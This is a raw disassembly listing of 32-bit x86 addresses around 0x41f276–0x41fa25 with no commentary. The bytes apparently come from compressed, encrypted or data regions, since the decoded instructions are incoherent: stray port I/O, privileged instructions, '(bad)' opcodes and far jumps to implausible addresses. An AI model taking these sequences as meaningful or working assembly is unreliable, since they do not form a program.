  41f276:	ins    BYTE PTR es:[edi],dx
  41f277:	lock push esi
  41f279:	sbb    ch,BYTE PTR [edi]
  41f27b:	pop    esp
  41f27c:	mov    bl,0x2d
  41f27e:	out    0x3,eax
  41f280:	in     al,dx
  41f281:	sub    al,0x3b
  41f283:	sbb    DWORD PTR ds:0x75040f02,esi
  41f289:	add    al,BYTE PTR [edi-0x2d]
  41f28c:	std    
  41f28d:	cmp    eax,0xfae76f16
  41f292:	gs push esi
  41f294:	int3   
  41f295:	push   ds
  41f296:	ins    BYTE PTR es:[edi],dx
  41f297:	lock xchg esi,eax
  41f299:	and    ch,BYTE PTR [edi-0x18d0eca5]
  41f29f:	add    edi,esp
  41f2a1:	add    ah,bh
  41f2a3:	add    esi,ebp
  41f2a5:	rcl    eax,1
  41f2a7:	outs   dx,BYTE PTR ds:[esi]
  41f2a8:	std    
  41f2a9:	cmp    eax,0xfaa76e96
  41f2ae:	sub    eax,0x741c8c56
  41f2b3:	lock push esi
  41f2b5:	sbb    bh,BYTE PTR [edi-0x18d100a5]
  41f2bb:	add    esp,DWORD PTR [eax+ebx*8+0x7b0d]
  41f2c2:	add    BYTE PTR [eax],al
  41f2c4:	add    BYTE PTR [ecx],bh
  41f2c6:	rol    DWORD PTR ds:0x146572f9,cl
  41f2cc:	cmp    DWORD PTR [ebp-0x413fca9b],0xffffffc1
  41f2d3:	out    0xd6,al
  41f2d5:	loope  0x41f2e6
  41f2d7:	call   DWORD PTR [ecx]
  41f2d9:	xor    eax,0x96ef6702
  41f2de:	hlt    
  41f2df:	out    0xfe,al
  41f2e1:	test   BYTE PTR [ebx+0x797503e6],0x3b
  41f2e8:	cld    
  41f2e9:	ror    BYTE PTR [ebx],cl
  41f2eb:	mov    eax,0x29b16e
  41f2f0:	stos   BYTE PTR es:[edi],al
  41f2f1:	lods   eax,DWORD PTR ds:[esi]
  41f2f2:	sti    
  41f2f3:	push   ebp
  41f2f4:	rcr    DWORD PTR [ebp+0x55],0xfc
  41f2f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2f9:	dec    edi
  41f2fa:	inc    ebx
  41f2fb:	jae    0x41f30f
  41f2fd:	push   cs
  41f2fe:	push   ebp
  41f2ff:	sahf   
  41f300:	or     eax,0x1ffc235
  41f305:	or     ebx,DWORD PTR ds:0x1246fdfd
  41f30b:	mov    DWORD PTR ds:0x46e80ea9,esp
  41f311:	cmc    
  41f312:	gs cld 
  41f314:	dec    eax
  41f315:	pop    edx
  41f316:	cmp    DWORD PTR [eax-0x17],eax
  41f319:	retf   
  41f31a:	icebp  
  41f31b:	add    eax,0xae10b101
  41f320:	jmp    0x1da5789b
  41f325:	aaa    
  41f326:	gs or  ebp,0x0
  41f32d:	add    BYTE PTR [eax+0xa],dh
  41f330:	add    BYTE PTR [eax-0x16bfc6e6],cl
  41f336:	mul    eax
  41f338:	add    eax,0x63857909
  41f33d:	xor    eax,0xbd876537
  41f342:	js     0x41f34a
  41f344:	lahf   
  41f345:	lea    ecx,[edx-0x3e]
  41f348:	jmp    DWORD PTR [ecx-0x3e]
  41f34b:	and    BYTE PTR [eax+0x70],bh
  41f34e:	mov    edx,0xda480ffe
  41f353:	cmp    BYTE PTR [eax-0x17],al
  41f356:	outs   dx,DWORD PTR ds:[esi]
  41f357:	mov    ecx,0xb9616d23
  41f35c:	add    eax,0xcbe117fd
  41f361:	sub    bh,BYTE PTR [ecx+0x7b]
  41f364:	dec    ebx
  41f365:	or     eax,0xe74b7d61
  41f36a:	call   0x2069:0xb3001f5b
  41f371:	js     0x41f39a
  41f373:	jp     0x41f395
  41f375:	sbb    BYTE PTR [eax+eax*1-0x1aa81800],0xfb
  41f37d:	dec    DWORD PTR [edi]
  41f37f:	jb     0x41f3a1
  41f381:	adc    BYTE PTR [esp+ebp*2+0x1a68ff05],bl
  41f388:	adc    al,ch
  41f38a:	xor    eax,0x5bfffcfa
  41f38f:	xlat   BYTE PTR ds:[ebx]
  41f390:	adc    DWORD PTR [eax+eax*1],ebx
  41f393:	add    BYTE PTR [eax],al
  41f395:	add    BYTE PTR [eax],al
  41f397:	dec    esi
  41f398:	inc    eax
  41f399:	cld    
  41f39a:	jmp    0xfe8f:0xcc489759
  41f3a1:	cmc    
  41f3a2:	inc    esp
  41f3a3:	push   0xb7403f6
  41f3a8:	jmp    0x41f3ea
  41f3aa:	and    al,0x38
  41f3ac:	jmp    0x41f3f7
  41f3ae:	adc    ch,dl
  41f3b0:	inc    DWORD PTR [esi-0x78b997bc]
  41f3b6:	dec    ebp
  41f3b7:	dec    eax
  41f3b8:	dec    edi
  41f3b9:	test   DWORD PTR [ecx],eax
  41f3bb:	arpl   WORD PTR [ebx],cx
  41f3bd:	sbb    BYTE PTR [edx],dl
  41f3bf:	int3   
  41f3c0:	inc    DWORD PTR [esi+0x46c82475]
  41f3c6:	lock jae 0x41f39e
  41f3c9:	aaa    
  41f3ca:	ret    
  41f3cb:	jmp    0xfb2a4639
  41f3d0:	out    dx,eax
  41f3d1:	sti    
  41f3d2:	push   DWORD PTR [edi]
  41f3d4:	ret    
  41f3d5:	jo     0x41f3f8
  41f3d7:	addr16 out dx,al
  41f3d9:	popf   
  41f3da:	fs nop
  41f3dc:	inc    ecx
  41f3dd:	cld    
  41f3de:	push   0xffffffea
  41f3e0:	pop    es
  41f3e1:	sti    
  41f3e2:	je     0x41f3ae
  41f3e4:	arpl   sp,sp
  41f3e6:	pop    eax
  41f3e7:	add    DWORD PTR [eax],eax
  41f3e9:	add    BYTE PTR [ebx+0x64281575],cl
  41f3ef:	out    dx,al
  41f3f0:	inc    esi
  41f3f1:	in     al,0xcb
  41f3f3:	ss pop ecx
  41f3f5:	jns    0x41f43a
  41f3f7:	adc    DWORD PTR [ebp-0x2d],0xfffffffc
  41f3fb:	add    BYTE PTR [eax],al
  41f3fd:	add    BYTE PTR [eax],al
  41f3ff:	add    BYTE PTR [eax+0x75400e4d],al
  41f405:	mov    ah,0x23
  41f408:	xor    eax,0x928be491
  41f40d:	test   BYTE PTR [edi+0x43],dh
  41f410:	push   ecx
  41f411:	gs retf 
  41f413:	pop    ebp
  41f414:	push   ds
  41f415:	loopne 0x41f47c
  41f417:	pop    edx
  41f418:	mov    bh,0x49
  41f41a:	add    BYTE PTR [ebx-0x2],dl
  41f41d:	je     0x41f477
  41f41f:	push   edx
  41f420:	sbb    BYTE PTR [edx+0x0],0x84
  41f424:	xor    eax,0xa655c06d
  41f429:	ret    
  41f42a:	sub    DWORD PTR [ebx+0x65],esi
  41f42d:	dec    ebp
  41f42e:	or     esi,DWORD PTR [edi]
  41f430:	rcr    BYTE PTR [ebp-0xc],0x19
  41f434:	int    0x59
  41f436:	add    BYTE PTR [eax],al
  41f438:	adc    eax,0x320ff5bc
  41f43d:	scas   al,BYTE PTR es:[edi]
  41f43e:	cld    
  41f43f:	cld    
  41f440:	mov    al,ds:0xa1126b61
  41f445:	dec    esi
  41f446:	sar    bh,0xed
  41f449:	test   DWORD PTR [eax],edx
  41f44b:	xchg   DWORD PTR [eax+0x6d427d55],ecx
  41f451:	test   eax,0xa969427d
  41f456:	sar    ah,cl
  41f458:	xor    BYTE PTR [ecx+0x2f],0xc7
  41f45c:	fisttp QWORD PTR [eax-0x75150393]
  41f462:	jg     0x41f45b
  41f464:	add    BYTE PTR [eax],al
  41f466:	add    BYTE PTR [eax],al
  41f468:	add    dl,ah
  41f46a:	in     eax,dx
  41f46b:	add    ebx,DWORD PTR [ebx-0x26]
  41f46e:	add    DWORD PTR [esp+edi*2],ecx
  41f471:	addr16 ret 0xc8e6
  41f475:	mov    ah,0xd
  41f477:	out    0xd0,eax
  41f479:	in     eax,dx
  41f47a:	push   ebp
  41f47b:	mov    esi,0xe701606a
  41f480:	jg     0x41f474
  41f482:	in     eax,dx
  41f483:	shl    BYTE PTR es:[ebp+0x6c],cl
  41f487:	out    dx,eax
  41f488:	lock jb 0x41f479
  41f48b:	int    0x2c
  41f48d:	neg    BYTE PTR es:[edx]
  41f490:	push   cs
  41f491:	sbb    eax,0xd503e702
  41f496:	bound  ebx,QWORD PTR [ebx]
  41f498:	adc    al,0x80
  41f49a:	in     al,dx
  41f49b:	fisubr DWORD PTR [edx+0x7]
  41f49e:	cli    
  41f49f:	test   DWORD PTR [ecx],edx
  41f4a1:	sub    eax,edi
  41f4a3:	es add al,0xf2
  41f4a6:	xlat   BYTE PTR ds:[ebx]
  41f4a7:	(bad)  
  41f4a8:	jl     0x41f491
  41f4aa:	push   cs
  41f4ab:	pop    esp
  41f4ac:	rol    DWORD PTR [edx+0x66c173b2],0xb2
  41f4b3:	mov    ah,0x6a
  41f4b5:	(bad)  
  41f4b6:	or     bl,BYTE PTR [edx]
  41f4b8:	cmp    eax,0x6b4a5c5a
  41f4bd:	cmp    ecx,eax
  41f4bf:	imul   ebp,DWORD PTR [ecx+esi*1-0x28],0x2829c8e5
  41f4c7:	ja     0x41f4da
  41f4c9:	mov    ch,0x2
  41f4cb:	mov    WORD PTR [ebp+0x0],es
  41f4ce:	add    BYTE PTR [eax],al
  41f4d0:	add    BYTE PTR [eax],al
  41f4d2:	xchg   BYTE PTR [edx],al
  41f4d4:	mov    esp,0x2861e7e
  41f4d9:	ins    BYTE PTR es:[edi],dx
  41f4da:	cmc    
  41f4db:	outs   dx,BYTE PTR ds:[esi]
  41f4dc:	ret    0x1ad1
  41f4df:	mov    ds:0x867504f4,eax
  41f4e4:	es lock addr16 adc eax,0x8f92ddf5
  41f4ec:	jmp    FWORD PTR [edx+eax*4-0x1d8bc8f2]
  41f4f3:	aam    0x12
  41f4f5:	aas    
  41f4f6:	test   eax,0x6739125e
  41f4fb:	ret    0x69ff
  41f4fe:	or     BYTE PTR ds:0xa9525c5,0x28
  41f505:	jmp    0xfb2af780
  41f50a:	pop    ds
  41f50b:	aam    0xb
  41f50d:	sbb    DWORD PTR [ecx-0x24],eax
  41f510:	stos   DWORD PTR es:[edi],eax
  41f511:	jmp    0xcdb60e8c
  41f516:	adc    dh,0x23
  41f519:	loopne 0x41f4b5
  41f51b:	and    eax,0xea6f1d10
  41f520:	(bad)  
  41f521:	call   0xfe3e979c
  41f526:	xchg   edx,eax
  41f527:	cli    
  41f528:	cld    
  41f529:	cmc    
  41f52a:	mov    bh,dl
  41f52c:	cld    
  41f52d:	cld    
  41f52e:	pop    esi
  41f52f:	pop    esi
  41f530:	adc    ch,ch
  41f532:	test   edx,eax
  41f534:	jmp    FWORD PTR [edi+0x0]
  41f537:	add    BYTE PTR [eax],al
  41f539:	add    BYTE PTR [eax],al
  41f53b:	bound  esp,QWORD PTR ds:0x255a7010
  41f541:	adc    al,0x64
  41f543:	add    ah,BYTE PTR ds:0xc5bdb920
  41f549:	and    ecx,DWORD PTR [ecx]
  41f54b:	dec    ecx
  41f54c:	mov    bh,0xfc
  41f54e:	mov    ah,0x2e
  41f550:	adc    al,bh
  41f552:	inc    ecx
  41f553:	inc    ebx
  41f554:	pop    ebp
  41f555:	cld    
  41f556:	cs repz pop eax
  41f559:	cld    
  41f55a:	pushf  
  41f55b:	jp     0x41f4ea
  41f55d:	inc    ebx
  41f55e:	lds    ecx,FWORD PTR [esi]
  41f560:	push   0x0
  41f562:	bound  esi,QWORD PTR ds:0x6e94fd0d
  41f568:	pop    edi
  41f569:	jb     0x41f56b
  41f56b:	shr    bl,1
  41f56d:	jno    0x41f57f
  41f56f:	or     al,0xec
  41f571:	jno    0x41f57b
  41f573:	jmp    0x41f585
  41f575:	mov    al,ds:0x5e050c15
  41f57a:	mov    eax,ecx
  41f57c:	dec    eax
  41f57d:	mov    esi,0x874fdc14
  41f582:	in     al,dx
  41f583:	dec    edi
  41f584:	loop   0x41f57a
  41f586:	cmp    eax,0xfffffff9
  41f589:	push   ebp
  41f58a:	call   0x3f0646
  41f58f:	adc    dh,al
  41f591:	jo     0x41f608
  41f593:	lahf   
  41f594:	shl    BYTE PTR [esi+0x28],cl
  41f597:	cmp    DWORD PTR [edx+0x20],eax
  41f59a:	or     al,0x95
  41f59c:	outs   dx,DWORD PTR ds:[esi]
  41f59d:	or     BYTE PTR [ebp+0x0],dh
  41f5a0:	add    BYTE PTR [eax],al
  41f5a2:	add    BYTE PTR [eax],al
  41f5a4:	xor    DWORD PTR [edx],0x3481ff4c
  41f5aa:	adc    al,BYTE PTR [eax-0x74]
  41f5ad:	test   eax,eax
  41f5af:	or     al,0x23
  41f5b1:	inc    ebx
  41f5b2:	and    BYTE PTR [eax],cl
  41f5b4:	inc    esp
  41f5b5:	add    al,0x0
  41f5b7:	add    bh,dh
  41f5b9:	adc    eax,0x343875fb
  41f5be:	in     al,0xd8
  41f5c0:	out    0x6,eax
  41f5c2:	add    BYTE PTR [ecx],bh
  41f5c4:	and    BYTE PTR [eax],al
  41f5c6:	adc    al,0x74
  41f5c8:	jo     0x41f5f5
  41f5ca:	je     0x41f5f0
  41f5cc:	cmp    al,0x70
  41f5ce:	sbb    ch,BYTE PTR [eax+0x1c]
  41f5d1:	add    al,0x0
  41f5d3:	mov    al,ds:0x1820526b
  41f5d8:	imul   edx,DWORD PTR [edx+0x20],0x18
  41f5dc:	dec    ebx
  41f5dd:	outs   dx,DWORD PTR ds:[esi]
  41f5de:	add    al,0xff
  41f5e0:	adc    DWORD PTR [eax-0x22e3bfef],esi
  41f5e6:	jo     0x41f60c
  41f5e8:	jne    0x41f643
  41f5ea:	jns    0x41f65f
  41f5ec:	push   ecx
  41f5ed:	push   ebp
  41f5ee:	jne    0x41f633
  41f5f0:	cdq    
  41f5f1:	dec    ecx
  41f5f2:	ror    BYTE PTR [edx+0x50204531],1
  41f5f8:	dec    ebx
  41f5f9:	pop    eax
  41f5fa:	in     eax,dx
  41f5fb:	pop    es
  41f5fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5fd:	and    bl,BYTE PTR [ebp+eax*8-0x32]
  41f601:	push   0x40cd8067
  41f606:	in     eax,dx
  41f607:	sbb    eax,DWORD PTR [eax]
  41f609:	add    BYTE PTR [eax],al
  41f60b:	add    BYTE PTR [eax],al
  41f60d:	lock sub eax,0x6cce0820
  41f613:	jnp    0x41f657
  41f615:	or     DWORD PTR [eax-0x13],0x1016aa17
  41f61c:	std    
  41f61d:	sub    BYTE PTR [ecx],bh
  41f61f:	sar    ah,1
  41f621:	and    BYTE PTR [ecx+0x67],ah
  41f624:	adc    bl,cl
  41f626:	pop    esi
  41f627:	sar    bh,0x28
  41f62a:	aam    0x5d
  41f62c:	pop    edx
  41f62d:	mov    bh,0x5d
  41f62f:	add    BYTE PTR [ecx+0x23],dl
  41f632:	in     al,0xec
  41f634:	and    eax,DWORD PTR [ecx+0x1d1266ff]
  41f63a:	ss sar bh,0xef
  41f63e:	jo     0x41f698
  41f640:	dec    esi
  41f641:	sub    BYTE PTR [edx+0x0],0x84
  41f645:	xor    eax,0xa551c3d
  41f64a:	lods   eax,DWORD PTR ds:[esi]
  41f64b:	xor    al,0x40
  41f64d:	jne    0x41f5ef
  41f64f:	adc    bl,BYTE PTR [di+0x5b]
  41f653:	sar    bh,0x1a
  41f656:	and    eax,0xec2afc56
  41f65b:	push   0x586ea9fc
  41f660:	xchg   edi,eax
  41f661:	or     esi,DWORD PTR [eax]
  41f663:	push   0xfc021254
  41f668:	pop    es
  41f669:	addr16 ret 0xc8e6
  41f66d:	mov    al,ds:0xcc298b
  41f672:	add    BYTE PTR [eax],al
  41f674:	add    BYTE PTR [eax],al
  41f676:	xor    al,0x6
  41f678:	out    0xce,eax
  41f67a:	std    
  41f67b:	ins    DWORD PTR es:[edi],dx
  41f67c:	push   cs
  41f67d:	or     eax,0x7fe70186
  41f682:	and    dl,dh
  41f684:	mov    edi,0xa418b534
  41f689:	test   DWORD PTR [esi+0x24],0xd87ac120
  41f690:	sti    
  41f691:	sub    al,0x36
  41f693:	neg    BYTE PTR [edx+0xc]
  41f696:	and    eax,0x86f1cdb2
  41f69b:	lea    ebp,[ebx]
  41f69d:	cld    
  41f69e:	test   eax,0x2766d6d4
  41f6a3:	push   cs
  41f6a4:	mov    edi,0xad5ea1bd
  41f6a9:	or     DWORD PTR [edx+0x2fff1b5e],0x5f
  41f6b0:	ret    
  41f6b1:	xchg   ebx,eax
  41f6b2:	addr16 ret 0xc8e6
  41f6b6:	mov    ah,0xf1
  41f6b8:	out    0xd0,al
  41f6ba:	std    
  41f6bb:	outs   dx,BYTE PTR ds:[esi]
  41f6bc:	sbb    al,0x5c
  41f6be:	inc    ebx
  41f6bf:	mul    edi
  41f6c1:	add    ebp,esp
  41f6c3:	xlat   BYTE PTR ds:[ebx]
  41f6c4:	loop   0x41f745
  41f6c6:	sbb    dl,bh
  41f6c8:	mov    edi,0xbd74880
  41f6cd:	jnp    0x41f66f
  41f6cf:	mul    BYTE PTR [ebx+0x52]
  41f6d2:	(bad)  
  41f6d3:	cld    
  41f6d4:	arpl   WORD PTR [esi-0x7f21769e],di
  41f6da:	add    BYTE PTR [eax],al
  41f6dc:	add    BYTE PTR [eax],al
  41f6de:	add    BYTE PTR [ebx],bh
  41f6e0:	xlat   BYTE PTR ds:[ebx]
  41f6e1:	(bad)  [esi-0x59]
  41f6e4:	not    al
  41f6e6:	add    al,0xc5
  41f6e8:	mov    bl,0xff
  41f6ea:	call   0x5774:0x4107c09d
  41f6f1:	cld    
  41f6f2:	not    BYTE PTR es:[ebp-0x4]
  41f6f6:	xchg   esp,eax
  41f6f7:	pop    di
  41f6f9:	jb     0x41f6f8
  41f6fb:	xchg   ebx,eax
  41f6fc:	ror    BYTE PTR [edi],1
  41f6fe:	mov    bh,0x5b
  41f700:	rol    BYTE PTR [edi],1
  41f702:	push   es
  41f703:	test   BYTE PTR [esi+0x12],dh
  41f706:	test   eax,0x2b5abc76
  41f70b:	add    DWORD PTR [edx],0x652d6253
  41f711:	mov    edi,ebp
  41f713:	jno    0x41f717
  41f715:	test   BYTE PTR [ecx+0x5cfcf4d2],ch
  41f71b:	mov    DWORD PTR gs:[edx-0x1f],eax
  41f71f:	int3   
  41f720:	add    edi,ebp
  41f722:	cmp    al,0xad
  41f724:	jmp    0x41f725
  41f726:	push   edx
  41f727:	jns    0x41f793
  41f729:	enter  0x13bf,0x5e
  41f72d:	xor    BYTE PTR [ecx+0x4404d01b],0x12
  41f734:	and    BYTE PTR [eax+0x5b5db6f4],bl
  41f73a:	stos   DWORD PTR es:[edi],eax
  41f73b:	data16 add dl,BYTE PTR [ebx+0x62]
  41f73f:	retf   0x5b65
  41f742:	fld    QWORD PTR [eax]
  41f744:	add    BYTE PTR [eax],al
  41f746:	add    BYTE PTR [eax],al
  41f748:	jno    0x41f74c
  41f74a:	test   BYTE PTR [ecx+0x1e55c352],ch
  41f750:	adc    cl,cl
  41f752:	retf   
  41f753:	sub    bh,BYTE PTR [ecx-0x49]
  41f756:	cld    
  41f757:	cld    
  41f758:	jle    0x41f74a
  41f75a:	aas    
  41f75b:	jmp    0x4149c81f
  41f760:	xlat   BYTE PTR ds:[ebx]
  41f761:	imul   edi,esp,0xfc54f74e
  41f767:	add    al,ch
  41f769:	push   es
  41f76a:	rol    BYTE PTR [si+0x101],0x64
  41f770:	push   eax
  41f771:	inc    eax
  41f772:	cld    
  41f773:	add    ah,0xc
  41f776:	std    
  41f777:	je     0x41f77c
  41f779:	fadd   DWORD PTR [eax+edx*1-0x71]
  41f77d:	outs   dx,BYTE PTR ds:[esi]
  41f77e:	add    BYTE PTR [eax],al
  41f780:	fcomp  DWORD PTR [esi-0x79]
  41f783:	inc    eax
  41f784:	mov    eax,0xb0841dd
  41f789:	in     al,0x11
  41f78b:	sbb    al,0xbe
  41f78d:	inc    eax
  41f78e:	cld    
  41f78f:	pop    esi
  41f790:	add    cl,BYTE PTR [edx-0x5]
  41f793:	and    eax,0x3ff29c
  41f798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f799:	push   edi
  41f79a:	adc    BYTE PTR [ecx],al
  41f79c:	int3   
  41f79d:	fdivr  QWORD PTR [esp+esi*2+0x2448d9d5]
  41f7a4:	xchg   esp,eax
  41f7a5:	mov    eax,0xe6b3eeb0
  41f7aa:	sti    
  41f7ab:	and    eax,0x0
  41f7b0:	add    BYTE PTR [ecx*1-0x304bffc0],cl
  41f7b7:	lidtd  [esp+ebx*8-0x267a8b44]
  41f7bf:	dec    eax
  41f7c0:	and    al,0x84
  41f7c2:	mov    eax,0xe6e3ee98
  41f7c7:	sti    
  41f7c8:	and    eax,0x400be0
  41f7cd:	mov    ecx,ebx
  41f7cf:	call   0xfd965957
  41f7d4:	je     0x41f811
  41f7d6:	cmp    DWORD PTR [ecx+0x14],0x58
  41f7da:	ins    DWORD PTR es:[edi],dx
  41f7db:	or     eax,0xfcf187e8
  41f7e0:	(bad)  
  41f7e1:	fadd   st,st(6)
  41f7e3:	jo     0x41f7ed
  41f7e5:	jne    0x41f7c7
  41f7e7:	mov    ah,0xf
  41f7e9:	sbb    eax,0x2afc5234
  41f7ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7ef:	arpl   WORD PTR [edx],sp
  41f7f1:	icebp  
  41f7f2:	ss sar bh,0xc0
  41f7f6:	fs stos BYTE PTR es:[edi],al
  41f7f8:	jae    0x41f853
  41f7fa:	popa   
  41f7fb:	retf   
  41f7fc:	mov    cl,cl
  41f7fe:	mov    eax,0x6a02fefb
  41f803:	ja     0x41f811
  41f805:	lock and dh,al
  41f808:	add    eax,0xfed66afe
  41f80d:	jmp    0x41f848
  41f80f:	jg     0x41f835
  41f811:	jne    0x41f7ab
  41f813:	inc    eax
  41f814:	pop    esp
  41f815:	add    BYTE PTR [eax],al
  41f817:	add    BYTE PTR [eax],al
  41f819:	add    BYTE PTR [ebx-0x1e],dl
  41f81c:	jg     0x41f88e
  41f81e:	ins    DWORD PTR es:[edi],dx
  41f81f:	push   0x0
  41f821:	add    BYTE PTR [ebx],ch
  41f823:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f824:	cld    
  41f825:	jmp    FWORD PTR [ecx]
  41f827:	rcl    BYTE PTR [esi+edi*2-0x37],1
  41f82b:	xor    DWORD PTR [eax],eax
  41f82d:	add    BYTE PTR [ebp+0x18],dh
  41f830:	into   
  41f831:	push   esp
  41f832:	clc    
  41f833:	cs pushf 
  41f835:	dec    edi
  41f836:	mov    ebx,0x92ff6726
  41f83b:	add    BYTE PTR [ebp-0x3],al
  41f83e:	xchg   edx,eax
  41f83f:	mov    esi,0x569dcbed
  41f844:	dec    esp
  41f845:	inc    DWORD PTR [edx+0x75d3dde8]
  41f84b:	loopne 0x41f88f
  41f84d:	les    edi,FWORD PTR [eax-0x4a8b3383]
  41f853:	imul   ebx,DWORD PTR [eax+0x64],0x8863dc2a
  41f85a:	mov    eax,0x6d807561
  41f85f:	push   0x0
  41f861:	add    ah,bh
  41f863:	add    DWORD PTR [ebx+eiz*2+0x2ee7eef],ebp
  41f86a:	jne    0x41f86e
  41f86c:	sub    eax,0x26021ebe
  41f871:	mov    esi,0xc3d19926
  41f876:	and    cl,BYTE PTR [edx-0x3b0cc05d]
  41f87c:	ds js  0x41f87f
  41f87f:	add    BYTE PTR [eax],al
  41f881:	add    BYTE PTR [eax],al
  41f883:	mov    bh,0x6a
  41f885:	popa   
  41f886:	xor    edi,esp
  41f888:	les    ebx,FWORD PTR [edx]
  41f88a:	js     0x41f816
  41f88c:	jmp    FWORD PTR [ebx-0x19]
  41f88f:	aas    
  41f890:	stos   BYTE PTR es:[edi],al
  41f891:	pop    edi
  41f892:	out    0xe2,al
  41f894:	test   BYTE PTR [edi+ebp*8],dl
  41f897:	xor    eax,0x325fab8d
  41f89c:	lea    esp,[ebx-0x2115d5c5]
  41f8a2:	adc    esi,DWORD PTR [ebp+0x2]
  41f8a5:	jg     0x41f90b
  41f8a7:	leave  
  41f8a8:	add    edi,esp
  41f8aa:	bound  ecx,QWORD PTR [eax+0x6]
  41f8ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8ae:	leave  
  41f8af:	(bad)  
  41f8b0:	add    eax,0x5b7503e7
  41f8b5:	repz repz add dl,0xe6
  41f8ba:	mov    dl,ah
  41f8bc:	aam    0xd3
  41f8be:	nop
  41f8bf:	aaa    
  41f8c0:	dec    edx
  41f8c1:	push   ss
  41f8c2:	arpl   WORD PTR [eax],cx
  41f8c4:	or     ch,BYTE PTR [esi+0x26f11ef9]
  41f8ca:	add    al,0xf6
  41f8cc:	inc    ecx
  41f8cd:	in     eax,dx
  41f8ce:	mov    BYTE PTR [edi+0x7003e700],dl
  41f8d4:	sar    BYTE PTR [edx+0x6c],1
  41f8d7:	xchg   edi,eax
  41f8d8:	pop    ecx
  41f8d9:	test   DWORD PTR [ebx-0x13],esp
  41f8dc:	mov    edi,0xc3231372
  41f8e1:	push   DWORD PTR [ebp+0x9]
  41f8e4:	(bad)  
  41f8e5:	fist   WORD PTR [esi]
  41f8e7:	add    BYTE PTR [eax],al
  41f8e9:	add    BYTE PTR [eax],al
  41f8eb:	add    BYTE PTR [ecx+0x2],dh
  41f8ee:	test   BYTE PTR [ecx],ch
  41f8f0:	sbb    al,0xf2
  41f8f2:	gs push 0xffffff96
  41f8f5:	add    cl,BYTE PTR ds:0xfc58bb6d
  41f8fb:	jmp    0x70a73b83
  41f900:	outs   dx,BYTE PTR ds:[esi]
  41f901:	inc    eax
  41f902:	inc    edx
  41f903:	inc    edx
  41f904:	jo     0x41f967
  41f906:	mov    bl,0xe8
  41f908:	jbe    0x41f90c
  41f90a:	push   0xffffffd5
  41f90c:	sahf   
  41f90d:	mov    esp,0x8576e9a7
  41f912:	mov    edi,0x4a8aff95
  41f917:	sbb    eax,0xde0e9086
  41f91c:	or     al,0xc1
  41f91e:	cld    
  41f91f:	fwait
  41f920:	sub    DWORD PTR [ebx-0x38b2ee11],ecx
  41f926:	(bad)  
  41f927:	call   0xec2a632f
  41f92c:	arpl   WORD PTR [eax-0x7e],dx
  41f92f:	fbld   TBYTE PTR [edi+0x7e]
  41f932:	xchg   eax,ebp
  41f934:	jbe    0x41f938
  41f936:	mov    DWORD PTR [ebp+ebp*2+0x3f],edx
  41f93a:	inc    edx
  41f93b:	shl    DWORD PTR [esi-0x7b],cl
  41f93e:	cld    
  41f93f:	cmp    eax,0x6c048b52
  41f944:	lds    edi,FWORD PTR ds:0xc9161e4e
  41f94a:	das    
  41f94b:	fs ss aam 0x1a
  41f94f:	sldt   WORD PTR [eax]
  41f952:	add    BYTE PTR [eax],al
  41f954:	add    dl,bh
  41f956:	(bad)  
  41f958:	sahf   
  41f959:	outs   dx,BYTE PTR ds:[si]
  41f95b:	mov    edi,0xed4b66d
  41f960:	bound  edi,QWORD PTR [edi-0x14]
  41f963:	cld    
  41f964:	add    BYTE PTR [ebx-0x1ccbb31b],al
  41f96a:	sbb    eax,0xc5cac017
  41f96f:	test   BYTE PTR [ebp-0x3a],al
  41f972:	mov    BYTE PTR [ecx-0x10],al
  41f975:	dec    ebx
  41f976:	jl     0x41f98c
  41f978:	mov    eax,0x2c3c
  41f97d:	inc    edx
  41f97e:	clc    
  41f97f:	xlat   BYTE PTR ds:[ebx]
  41f980:	jb     0x41f956
  41f982:	jl     0x41f9b0
  41f984:	jne    0x41f992
  41f986:	add    eax,0x3c543b66
  41f98b:	cmp    ch,BYTE PTR [edx-0x36]
  41f98e:	jno    0x41f911
  41f990:	push   cs
  41f991:	pop    ebx
  41f992:	in     al,0xfb
  41f994:	push   0xc
  41f996:	xchg   ebp,eax
  41f997:	in     al,0xf3
  41f999:	cmp    dh,0xff
  41f99c:	mov    DWORD PTR [edx],esp
  41f99e:	or     DWORD PTR [edi-0x3c],edi
  41f9a1:	enter  0x33ec,0x51
  41f9a5:	int3   
  41f9a6:	add    al,0x66
  41f9a8:	ror    DWORD PTR [edi+0x6189660d],0x9
  41f9af:	sti    
  41f9b0:	(bad)  
  41f9b1:	fld    TBYTE PTR [ecx-0x7b]
  41f9b4:	popf   
  41f9b5:	retf   0xfbe1
  41f9b8:	inc    DWORD PTR [eax]
  41f9ba:	add    BYTE PTR [eax],al
  41f9bc:	add    BYTE PTR [eax],al
  41f9be:	dec    ecx
  41f9bf:	(bad)  [eax]
  41f9c1:	dec    ebx
  41f9c3:	loop   0x41f94c
  41f9c5:	(bad)  
  41f9c6:	mov    ah,0xd8
  41f9c8:	dec    esi
  41f9c9:	add    BYTE PTR [eax+eax*4-0x63828a44],cl
  41f9d0:	in     al,0x17
  41f9d2:	outs   dx,DWORD PTR ds:[esi]
  41f9d3:	(bad)  
  41f9d4:	inc    DWORD PTR [ebx-0x74f6cf24]
  41f9da:	xchg   edx,eax
  41f9db:	data16 std 
  41f9dd:	mov    cl,dl
  41f9df:	loop   0x41f9ed
  41f9e1:	jmp    0x45835b
  41f9e6:	jne    0x41f99e
  41f9e8:	test   BYTE PTR [ebx],cl
  41f9ea:	bound  eax,QWORD PTR [ecx-0x5b59b0a2]
  41f9f0:	imul   edi,DWORD PTR [esi],0xffffffa4
  41f9f3:	imul   eax,DWORD PTR [eax],0xfe4e3584
  41f9f9:	or     al,0xa
  41f9fb:	out    0xf,eax
  41f9fd:	std    
  41f9fe:	cmp    bh,BYTE PTR [ecx+0x66a947cb]
  41fa04:	and    edi,0xffffff80
  41fa07:	cs pop es
  41fa09:	or     eax,0xfd11deea
  41fa0e:	sbb    bl,BYTE PTR [ecx]
  41fa10:	jmp    0x2eb5:0xf6236be
  41fa17:	in     eax,0xc4
  41fa19:	out    dx,eax
  41fa1a:	fwait
  41fa1b:	sar    bl,cl
  41fa1d:	lds    esi,FWORD PTR [eax+0x890124]
  41fa23:	add    BYTE PTR [eax],al
  41fa25:	add    BYTE PTR [eax],al
